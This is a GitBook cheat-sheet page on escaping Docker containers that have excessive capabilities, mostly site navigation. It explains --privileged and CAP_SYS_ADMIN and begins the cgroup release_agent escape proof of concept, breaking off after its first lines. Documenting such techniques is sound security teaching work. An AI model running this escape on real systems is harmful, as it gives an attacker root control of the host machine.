
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Excessive Capabilities Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="host-networking-driver.html" />
    
    
    <link rel="prev" href="exposed-docker-socket.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../INTRODUCTION.html">
            
                <a href="../../INTRODUCTION.html">
            
                    
                    Application Security Cheat Sheet
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Android Application</li>
        
        
    
        <li class="chapter " data-level="2.1" >
            
                <span>
            
                    
                    Overview
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../../Mobile%20Application/Android/Overview/app-data-files.html">
            
                <a href="../../Mobile%20Application/Android/Overview/app-data-files.html">
            
                    
                    Application Data & Files
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.2" data-path="../../Mobile%20Application/Android/Overview/app-package.html">
            
                <a href="../../Mobile%20Application/Android/Overview/app-package.html">
            
                    
                    Application Package
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.3" data-path="../../Mobile%20Application/Android/Overview/app-sandbox.html">
            
                <a href="../../Mobile%20Application/Android/Overview/app-sandbox.html">
            
                    
                    Application Sandbox
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.4" data-path="../../Mobile%20Application/Android/Overview/app-signing.html">
            
                <a href="../../Mobile%20Application/Android/Overview/app-signing.html">
            
                    
                    Application Signing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.5" data-path="../../Mobile%20Application/Android/Overview/deployment.html">
            
                <a href="../../Mobile%20Application/Android/Overview/deployment.html">
            
                    
                    Deployment
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.6" data-path="../../Mobile%20Application/Android/Overview/package-manager.html">
            
                <a href="../../Mobile%20Application/Android/Overview/package-manager.html">
            
                    
                    Package Manager
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../../Mobile%20Application/Android/Intent%20Vulnerabilities/">
            
                <a href="../../Mobile%20Application/Android/Intent%20Vulnerabilities/">
            
                    
                    Intent Vulnerabilities
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../../Mobile%20Application/Android/Deep%20Linking%20Vulnerabilities/">
            
                <a href="../../Mobile%20Application/Android/Deep%20Linking%20Vulnerabilities/">
            
                    
                    Deep Linking Vulnerabilities
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../../Mobile%20Application/Android/WebView%20Vulnerabilities/">
            
                <a href="../../Mobile%20Application/Android/WebView%20Vulnerabilities/">
            
                    
                    WebView Vulnerabilities
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-resource-response-vulnerabilities.html">
            
                <a href="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-resource-response-vulnerabilities.html">
            
                    
                    WebResourceResponse Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.2" data-path="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-settings.html">
            
                <a href="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-settings.html">
            
                    
                    WebSettings Vulnerabilities
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Cloud</li>
        
        
    
        <li class="chapter " data-level="3.1" >
            
                <span>
            
                    
                    AWS
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1" data-path="../../Cloud/AWS/api-gateway.html">
            
                <a href="../../Cloud/AWS/api-gateway.html">
            
                    
                    Amazon API Gateway
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.2" data-path="../../Cloud/AWS/amazon-cognito.html">
            
                <a href="../../Cloud/AWS/amazon-cognito.html">
            
                    
                    Amazon Cognito
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3" data-path="../../Cloud/AWS/s3.html">
            
                <a href="../../Cloud/AWS/s3.html">
            
                    
                    Amazon S3
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Container</li>
        
        
    
        <li class="chapter " data-level="4.1" >
            
                <span>
            
                    
                    Overview
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.1" data-path="../Overview/basics.html">
            
                <a href="../Overview/basics.html">
            
                    
                    Container Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.2" data-path="../Overview/docker-engine.html">
            
                <a href="../Overview/docker-engine.html">
            
                    
                    Docker Engine
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.2" >
            
                <span>
            
                    
                    Escaping
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.2.1" data-path="cve-list.html">
            
                <a href="cve-list.html">
            
                    
                    CVE List
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.2" data-path="exposed-docker-socket.html">
            
                <a href="exposed-docker-socket.html">
            
                    
                    Exposed Docker Socket
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="4.2.3" data-path="excessive-capabilities.html">
            
                <a href="excessive-capabilities.html">
            
                    
                    Excessive Capabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.4" data-path="host-networking-driver.html">
            
                <a href="host-networking-driver.html">
            
                    
                    Host Networking Driver
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.5" data-path="sensitive-mounts.html">
            
                <a href="sensitive-mounts.html">
            
                    
                    Sensitive Mounts
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../container-analysis-tools.html">
            
                <a href="../container-analysis-tools.html">
            
                    
                    Container Analysis Tools
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Framework</li>
        
        
    
        <li class="chapter " data-level="5.1" >
            
                <span>
            
                    
                    Spring
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.1.1" data-path="../../Framework/Spring/overview.html">
            
                <a href="../../Framework/Spring/overview.html">
            
                    
                    Overview
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.2" data-path="../../Framework/Spring/mass-assignment.html">
            
                <a href="../../Framework/Spring/mass-assignment.html">
            
                    
                    Mass Assignment
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.3" data-path="../../Framework/Spring/routing-abuse.html">
            
                <a href="../../Framework/Spring/routing-abuse.html">
            
                    
                    Routing Abuse
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.4" data-path="../../Framework/Spring/spel-injection.html">
            
                <a href="../../Framework/Spring/spel-injection.html">
            
                    
                    SpEL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.5" data-path="../../Framework/Spring/spring-boot-actuators.html">
            
                <a href="../../Framework/Spring/spring-boot-actuators.html">
            
                    
                    Spring Boot Actuators
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.6" data-path="../../Framework/Spring/spring-data-redis-insecure-deserialization.html">
            
                <a href="../../Framework/Spring/spring-data-redis-insecure-deserialization.html">
            
                    
                    Spring Data Redis Insecure Deserialization
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.7" data-path="../../Framework/Spring/view-manipulation.html">
            
                <a href="../../Framework/Spring/view-manipulation.html">
            
                    
                    Spring View Manipulation
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="5.2" >
            
                <span>
            
                    
                    React
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.2.1" data-path="../../Framework/React/overview.html">
            
                <a href="../../Framework/React/overview.html">
            
                    
                    Overview
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2.2" data-path="../../Framework/React/security-issues.html">
            
                <a href="../../Framework/React/security-issues.html">
            
                    
                    Security Issues
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Linux</li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../../Linux/Overview/">
            
                <a href="../../Linux/Overview/">
            
                    
                    Overview
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.1.1" data-path="../../Linux/Overview/philosophy.html">
            
                <a href="../../Linux/Overview/philosophy.html">
            
                    
                    Philosophy
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.2" data-path="../../Linux/Overview/file.html">
            
                <a href="../../Linux/Overview/file.html">
            
                    
                    File
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.3" data-path="../../Linux/Overview/file-descriptor.html">
            
                <a href="../../Linux/Overview/file-descriptor.html">
            
                    
                    File Descriptor
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.4" data-path="../../Linux/Overview/io-redirection.html">
            
                <a href="../../Linux/Overview/io-redirection.html">
            
                    
                    I/O Redirection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.5" data-path="../../Linux/Overview/process.html">
            
                <a href="../../Linux/Overview/process.html">
            
                    
                    Process
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.6" data-path="../../Linux/Overview/inter-process-communication.html">
            
                <a href="../../Linux/Overview/inter-process-communication.html">
            
                    
                    Inter Process Communication
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.7" data-path="../../Linux/Overview/shell.html">
            
                <a href="../../Linux/Overview/shell.html">
            
                    
                    Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.8" data-path="../../Linux/Overview/signals.html">
            
                <a href="../../Linux/Overview/signals.html">
            
                    
                    Signals
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.9" data-path="../../Linux/Overview/socket.html">
            
                <a href="../../Linux/Overview/socket.html">
            
                    
                    Socket
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.1.10" data-path="../../Linux/Overview/user-kernel-space.html">
            
                <a href="../../Linux/Overview/user-kernel-space.html">
            
                    
                    User Space vs Kernel Space
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../../Linux/bash-tips.html">
            
                <a href="../../Linux/bash-tips.html">
            
                    
                    Bash Tips
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">iOS Application</li>
        
        
    
        <li class="chapter " data-level="7.1" >
            
                <span>
            
                    
                    Overview
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.1.1" data-path="../../Mobile%20Application/iOS/Overview/app-data-files.html">
            
                <a href="../../Mobile%20Application/iOS/Overview/app-data-files.html">
            
                    
                    Application Data & Files
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.1.2" data-path="../../Mobile%20Application/iOS/Overview/app-package.html">
            
                <a href="../../Mobile%20Application/iOS/Overview/app-package.html">
            
                    
                    Application Package
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.1.3" data-path="../../Mobile%20Application/iOS/Overview/app-sandbox.html">
            
                <a href="../../Mobile%20Application/iOS/Overview/app-sandbox.html">
            
                    
                    Application Sandbox
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.1.4" data-path="../../Mobile%20Application/iOS/Overview/app-signing.html">
            
                <a href="../../Mobile%20Application/iOS/Overview/app-signing.html">
            
                    
                    Application Signing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.1.5" data-path="../../Mobile%20Application/iOS/Overview/deployment.html">
            
                <a href="../../Mobile%20Application/iOS/Overview/deployment.html">
            
                    
                    Deployment
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.2" >
            
                <span>
            
                    
                    Getting Started
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.2.1" data-path="../../Mobile%20Application/iOS/Getting%20Started/ipa-patching.html">
            
                <a href="../../Mobile%20Application/iOS/Getting%20Started/ipa-patching.html">
            
                    
                    IPA Patching
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2.2" data-path="../../Mobile%20Application/iOS/Getting%20Started/source-patching.html">
            
                <a href="../../Mobile%20Application/iOS/Getting%20Started/source-patching.html">
            
                    
                    Source Code Patching
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2.3" data-path="../../Mobile%20Application/iOS/Getting%20Started/objection.html">
            
                <a href="../../Mobile%20Application/iOS/Getting%20Started/objection.html">
            
                    
                    Testing with Objection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Resources</li>
        
        
    
        <li class="chapter " data-level="8.1" >
            
                <span>
            
                    
                    Lists
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="8.1.1" data-path="../../Resources/Lists/payloads.html">
            
                <a href="../../Resources/Lists/payloads.html">
            
                    
                    Payloads
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.1.2" data-path="../../Resources/Lists/wordlists.html">
            
                <a href="../../Resources/Lists/wordlists.html">
            
                    
                    Wordlists
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="8.2" >
            
                <span>
            
                    
                    Researching
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="8.2.1" data-path="../../Resources/Researching/web-application.html">
            
                <a href="../../Resources/Researching/web-application.html">
            
                    
                    Web Application
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.2.2" data-path="../../Resources/Researching/write-ups.html">
            
                <a href="../../Resources/Researching/write-ups.html">
            
                    
                    Write-ups
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="8.3" >
            
                <span>
            
                    
                    Software
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="8.3.1" data-path="../../Resources/Software/aws-tools.html">
            
                <a href="../../Resources/Software/aws-tools.html">
            
                    
                    AWS Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.2" data-path="../../Resources/Software/azure-tools.html">
            
                <a href="../../Resources/Software/azure-tools.html">
            
                    
                    Azure Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.3" data-path="../../Resources/Software/component-analysis.html">
            
                <a href="../../Resources/Software/component-analysis.html">
            
                    
                    Component Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.4" data-path="../../Resources/Software/docker-analysis.html">
            
                <a href="../../Resources/Software/docker-analysis.html">
            
                    
                    Docker Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.5" data-path="../../Resources/Software/dynamic-analysis.html">
            
                <a href="../../Resources/Software/dynamic-analysis.html">
            
                    
                    Dynamic Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.6" data-path="../../Resources/Software/fuzzing.html">
            
                <a href="../../Resources/Software/fuzzing.html">
            
                    
                    Fuzzing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.7" data-path="../../Resources/Software/gcp-tools.html">
            
                <a href="../../Resources/Software/gcp-tools.html">
            
                    
                    GCP Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.8" data-path="../../Resources/Software/reverse-engineering.html">
            
                <a href="../../Resources/Software/reverse-engineering.html">
            
                    
                    Reverse Engineering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.9" data-path="../../Resources/Software/static-analysis.html">
            
                <a href="../../Resources/Software/static-analysis.html">
            
                    
                    Static Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.3.10" data-path="../../Resources/Software/vulnerability-scanning.html">
            
                <a href="../../Resources/Software/vulnerability-scanning.html">
            
                    
                    Vulnerability Scanning
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="8.4" >
            
                <span>
            
                    
                    Training
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="8.4.1" data-path="../../Resources/Training/secure-development.html">
            
                <a href="../../Resources/Training/secure-development.html">
            
                    
                    Secure Development
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Web Application</li>
        
        
    
        <li class="chapter " data-level="9.1" data-path="../../Web%20Application/Abusing%20HTTP%20hop-by-hop%20Request%20Headers/">
            
                <a href="../../Web%20Application/Abusing%20HTTP%20hop-by-hop%20Request%20Headers/">
            
                    
                    Abusing HTTP hop-by-hop Request Headers
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.2" data-path="../../Web%20Application/Broken%20Authentication/">
            
                <a href="../../Web%20Application/Broken%20Authentication/">
            
                    
                    Broken Authentication
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.2.1" data-path="../../Web%20Application/Broken%20Authentication/two-factor-authentication-vulnerabilities.html">
            
                <a href="../../Web%20Application/Broken%20Authentication/two-factor-authentication-vulnerabilities.html">
            
                    
                    Two-Factor Authentication Vulnerabilities
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.3" data-path="../../Web%20Application/Command%20Injection/">
            
                <a href="../../Web%20Application/Command%20Injection/">
            
                    
                    Command Injection
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.3.1" data-path="../../Web%20Application/Command%20Injection/parameters-injection.html">
            
                <a href="../../Web%20Application/Command%20Injection/parameters-injection.html">
            
                    
                    Parameters Injection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.4" data-path="../../Web%20Application/Content%20Security%20Policy/">
            
                <a href="../../Web%20Application/Content%20Security%20Policy/">
            
                    
                    Content Security Policy
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.5" data-path="../../Web%20Application/Cookie%20Security/">
            
                <a href="../../Web%20Application/Cookie%20Security/">
            
                    
                    Cookie Security
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.5.1" data-path="../../Web%20Application/Cookie%20Security/cookie-bomb.html">
            
                <a href="../../Web%20Application/Cookie%20Security/cookie-bomb.html">
            
                    
                    Cookie Bomb
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.5.2" data-path="../../Web%20Application/Cookie%20Security/cookie-jar-overflow.html">
            
                <a href="../../Web%20Application/Cookie%20Security/cookie-jar-overflow.html">
            
                    
                    Cookie Jar Overflow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.5.3" data-path="../../Web%20Application/Cookie%20Security/cookie-tossing.html">
            
                <a href="../../Web%20Application/Cookie%20Security/cookie-tossing.html">
            
                    
                    Cookie Tossing
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.6" data-path="../../Web%20Application/CORS%20Misconfiguration/">
            
                <a href="../../Web%20Application/CORS%20Misconfiguration/">
            
                    
                    CORS Misconfiguration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.7" data-path="../../Web%20Application/File%20Upload%20Vulnerabilities/">
            
                <a href="../../Web%20Application/File%20Upload%20Vulnerabilities/">
            
                    
                    File Upload Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.8" data-path="../../Web%20Application/GraphQL%20Vulnerabilities/">
            
                <a href="../../Web%20Application/GraphQL%20Vulnerabilities/">
            
                    
                    GraphQL Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.9" >
            
                <span>
            
                    
                    HTML Injection
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.9.1" data-path="../../Web%20Application/HTML%20Injection/base.html">
            
                <a href="../../Web%20Application/HTML%20Injection/base.html">
            
                    
                    base
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.9.2" data-path="../../Web%20Application/HTML%20Injection/iframe.html">
            
                <a href="../../Web%20Application/HTML%20Injection/iframe.html">
            
                    
                    iframe
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.9.3" data-path="../../Web%20Application/HTML%20Injection/meta.html">
            
                <a href="../../Web%20Application/HTML%20Injection/meta.html">
            
                    
                    meta
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.9.4" data-path="../../Web%20Application/HTML%20Injection/target.html">
            
                <a href="../../Web%20Application/HTML%20Injection/target.html">
            
                    
                    target attribute
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.10" data-path="../../Web%20Application/HTTP%20Headers%20Security/">
            
                <a href="../../Web%20Application/HTTP%20Headers%20Security/">
            
                    
                    HTTP Header Security
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.11" data-path="../../Web%20Application/HTTP%20Request%20Smuggling/">
            
                <a href="../../Web%20Application/HTTP%20Request%20Smuggling/">
            
                    
                    HTTP Request Smuggling
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.12" data-path="../../Web%20Application/Improper%20Rate%20Limits/">
            
                <a href="../../Web%20Application/Improper%20Rate%20Limits/">
            
                    
                    Improper Rate Limits
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.13" data-path="../../Web%20Application/JavaScript%20Prototype%20Pollution/">
            
                <a href="../../Web%20Application/JavaScript%20Prototype%20Pollution/">
            
                    
                    JavaScript Prototype Pollution
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.14" data-path="../../Web%20Application/JSON%20Web%20Token%20Vulnerabilities/">
            
                <a href="../../Web%20Application/JSON%20Web%20Token%20Vulnerabilities/">
            
                    
                    JSON Web Token Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.15" data-path="../../Web%20Application/OAuth%202.0%20Vulnerabilities/">
            
                <a href="../../Web%20Application/OAuth%202.0%20Vulnerabilities/">
            
                    
                    OAuth 2.0 Vulnerabilities
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.15.1" data-path="../../Web%20Application/OAuth%202.0%20Vulnerabilities/openid-connect.html">
            
                <a href="../../Web%20Application/OAuth%202.0%20Vulnerabilities/openid-connect.html">
            
                    
                    OpenID Connect Vulnerabilities
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.16" data-path="../../Web%20Application/Race%20Condition/">
            
                <a href="../../Web%20Application/Race%20Condition/">
            
                    
                    Race Condition
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.17" data-path="../../Web%20Application/Server%20Side%20Request%20Forgery/">
            
                <a href="../../Web%20Application/Server%20Side%20Request%20Forgery/">
            
                    
                    Server Side Request Forgery
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.17.1" data-path="../../Web%20Application/Server%20Side%20Request%20Forgery/post-exploitation.html">
            
                <a href="../../Web%20Application/Server%20Side%20Request%20Forgery/post-exploitation.html">
            
                    
                    Post Exploitation
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.18" data-path="../../Web%20Application/Web%20Cache%20Poisoning/">
            
                <a href="../../Web%20Application/Web%20Cache%20Poisoning/">
            
                    
                    Web Cache Poisoning
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >Excessive Capabilities</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#capsysadmin"><b></b>CAP_SYS_ADMIN</a></li><ul><li><span class="title-icon "></span><a href="#abusing-usermode-helper-api"><b></b>Abusing usermode helper API</a></li><ul><li><span class="title-icon "></span><a href="#requirements-to-use-this-technique"><b></b>Requirements to use this technique</a></li><li><span class="title-icon "></span><a href="#using-cgroups-to-deliver-the-exploit"><b></b>Using cgroups to deliver the exploit</a></li><li><span class="title-icon "></span><a href="#escape-only-with-capsysadmin-capability"><b></b>Escape only with CAP_SYS_ADMIN capability</a></li></ul><li><span class="title-icon "></span><a href="#abusing-exposed-host-directories"><b></b>Abusing exposed host directories</a></li></ul><li><span class="title-icon "></span><a href="#capsysmodule"><b></b>CAP_SYS_MODULE</a></li><li><span class="title-icon "></span><a href="#capsysrawio"><b></b>CAP_SYS_RAWIO</a></li><li><span class="title-icon "></span><a href="#capnetadmin"><b></b>CAP_NET_ADMIN</a></li><li><span class="title-icon "></span><a href="#capsyschroot"><b></b>CAP_SYS_CHROOT</a></li><li><span class="title-icon "></span><a href="#capsysptrace"><b></b>CAP_SYS_PTRACE</a></li><li><span class="title-icon "></span><a href="#capnetraw"><b></b>CAP_NET_RAW</a></li><li><span class="title-icon "></span><a href="#capsysboot"><b></b>CAP_SYS_BOOT</a></li><li><span class="title-icon "></span><a href="#capsyslog"><b></b>CAP_SYSLOG</a></li><li><span class="title-icon "></span><a href="#capdacreadsearch"><b></b>CAP_DAC_READ_SEARCH</a></li><li><span class="title-icon "></span><a href="#references"><b></b>References</a></li></ul></div><a href="#capsysadmin" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><p>Running a Docker container with <code>--privileged</code> or dangerous capabilities allows privileged operations. </p>
<p> {% hint style=&quot;info&quot; %} 
The <code>--privileged</code> flag gives all <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">capabilities</a> to the container, and it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can then do almost everything that the host can do. 
 {% endhint %} </p>
<p>You can use the <a href="https://man7.org/linux/man-pages/man1/capsh.1.html" target="_blank">capsh</a> command to see granted capabilities:</p>
<pre><code class="lang-bash">$ capsh --print | grep Current
</code></pre>
<h1 id="capsysadmin"><a name="capsysadmin" class="anchor-navigation-ex-anchor" href="#capsysadmin"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_SYS_ADMIN</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_SYS_ADMIN</a> is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). <code>CAP_SYS_ADMIN</code> is required to perform a range of administrative operations, which is difficult to drop from containers if privileged operations are performed within the container. Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive.</p>
<h2 id="abusing-usermode-helper-api"><a name="abusing-usermode-helper-api" class="anchor-navigation-ex-anchor" href="#abusing-usermode-helper-api"><i class="fa fa-link" aria-hidden="true"></i></a>Abusing usermode helper API</h2>
<p>Privileged containers can register usermode application helpers that are executed in the kernel context, for more information on invoking user-space applications from kernel see <a href="https://developer.ibm.com/technologies/linux/articles/l-user-space-apps/" target="_blank">here</a>.</p>
<p>The <a href="https://twitter.com/_fel1x/status/1151487051986087936" target="_blank">@_fel1x</a> escape technique is based on abusing the functionality of the <code>notify_on_release</code> feature in cgroups v1 to run the exploit as a fully privileged root user.</p>
<p>Here is a version of the PoC that launches <code>ps</code> on the host:</p>
<pre><code class="lang-bash"><span class="hljs-comment"># Finds + enables a cgroup release_agent</span>
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
<span class="hljs-comment"># Enables notify_on_release in the cgroup</span>
mkdir -p <span class="hljs-variable">$d</span>/w; <span class="hljs-built_in">echo</span> 1 &gt; <span class="hljs-variable">$d</span>/w/notify_on_release
<span class="hljs-comment"># Finds path of OverlayFS mount for container</span>
<span class="hljs-comment"># Unless the configuration explicitly exposes the mount point of the host filesystem</span>
<span class="hljs-comment"># see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html</span>
